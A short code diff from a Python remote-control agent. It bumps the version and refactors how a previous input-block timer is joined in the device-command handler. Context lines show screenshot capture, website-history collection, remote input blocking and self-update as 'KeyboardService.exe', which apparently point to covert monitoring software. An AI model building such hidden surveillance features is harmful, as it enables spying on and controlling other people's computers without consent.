@@ -50,7 +50,7 @@ WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
-APP_VERSION = "1.2.23"
+APP_VERSION = "1.2.24"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1207,9 +1207,10 @@ def handle_device_command(command, command_id=None, message=""):
                 raise RuntimeError("Input block duration must be between 1 and 3600 seconds")
             if input_block_stop_event is not None:
                 input_block_stop_event.set()
-            if input_block_timer is not None and input_block_timer.is_alive():
+            previous_input_block_timer = input_block_timer
+            if previous_input_block_timer is not None and previous_input_block_timer.is_alive():
                 try:
-                    input_block_timer.join(timeout=2)
+                    previous_input_block_timer.join(timeout=2)
                 except Exception:
                     pass
             stop_event = Event()
